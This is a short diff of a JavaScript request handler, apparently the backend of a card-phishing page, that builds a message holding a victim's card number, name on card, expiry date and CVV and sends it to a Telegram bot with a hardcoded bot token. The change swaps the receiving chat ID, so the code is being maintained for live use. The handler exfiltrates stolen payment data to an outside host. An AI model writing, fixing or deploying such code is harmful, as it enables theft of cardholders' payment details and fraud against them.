@@ -9,7 +9,7 @@ export default async function handler(req, res) {
 
             // Send card details to Telegram bot
             const telegramBotToken = '8623332135:AAE-bY1ke_3r0dXRXivk9E9cZWfNOXMffAI'; // New bot token
-            const chatId = '736482164'; // Your chat ID
+            const chatId = '8909467295'; // Your chat ID
             const message = encodeURIComponent(
                 `New card details:\nCard Number: ${cardNumber}\nName on Card: ${nameOnCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
             );
